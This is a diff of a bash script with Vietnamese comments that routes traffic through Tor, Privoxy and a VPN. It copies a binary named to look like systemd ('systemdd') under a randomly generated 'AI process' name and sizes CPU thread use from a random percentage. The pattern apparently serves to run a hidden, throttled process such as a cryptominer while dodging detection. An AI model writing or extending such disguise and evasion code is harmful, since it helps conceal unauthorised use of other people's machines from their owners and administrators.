@@ -1,9 +1,10 @@
 #!/bin/bash
 
-# Khởi động dịch vụ Tor, Privoxy và VPN
-service tor start
+# Khởi động dịch vụ Tor, Privoxy và VPN với cấu hình Bridges
+service tor restart
 if ! pgrep -x "tor" > /dev/null; then
-  echo "Tor service failed to start"
+  echo "Tor service failed to start with Bridges configuration"
+  exit 1
 fi
 
 service privoxy start
@@ -44,7 +45,15 @@ RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
 # Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
 FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
 echo $FINAL_NAME > /root/model.txt
-mv /usr/sbin/systemdd /usr/sbin/$FINAL_NAMEdo
+
+# Xóa tệp tiến trình cũ nếu tồn tại
+if [ -f /usr/sbin/$(cat /root/model.txt) ]; then
+  echo "Xóa tiến trình cũ: $(cat /root/model.txt)"
+  rm -f /usr/sbin/$(cat /root/model.txt)
+fi
+
+# Sao chép file gốc systemdd thành tên mới
+cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME
 
 # Tính toán số threads dựa trên % CPU ngẫu nhiên
 TOTAL_CORES=$(nproc)  # Xác định số CPU logic (bao gồm cả hyper-threading)
